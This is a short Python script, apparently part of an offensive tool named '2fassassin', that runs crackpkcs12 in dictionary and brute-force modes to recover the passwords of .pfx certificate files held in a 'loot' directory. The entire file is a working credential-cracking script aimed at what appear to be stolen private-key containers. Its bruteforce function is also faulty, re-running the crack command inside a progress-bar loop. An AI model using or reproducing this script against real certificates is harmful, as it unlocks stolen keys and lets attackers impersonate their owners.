#!/usr/bin/env python

import os, sys, glob
import subprocess
from subprocess import Popen
import os.path


def crack():
    wordlist = "/root/2fassassin/crack/wordlist/2fa-wordlist.txt"
    target = "/root/2fassassin/loot/*.pfx"
    sign = ""
    sign += "crackpkcs12 -v -d"
    sign += " "
    sign += wordlist
    sign += " "
    sign += target
    sign += "| tee crack.log"
    os.system(sign)
    sys.exit()

def bruteforce():
    import progressbar
    from time import sleep
    bar = progressbar.ProgressBar(maxval=60, \
        widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
    bar.start()
    for i in xrange(10):
        bar.update(i+1)
        sleep(0.05)
        wordlist = "/root/2fassassin/crack/wordlist/2fa-wordlist.txt"
        target = "/root/2fassassin/loot/*.pfx"
        sign = ""
        sign += "crackpkcs12 -v -b"
        sign += " "
        sign += target
        sign += "| tee crack.log"
        os.system(sign)
    bar.finish()
    sys.exit()
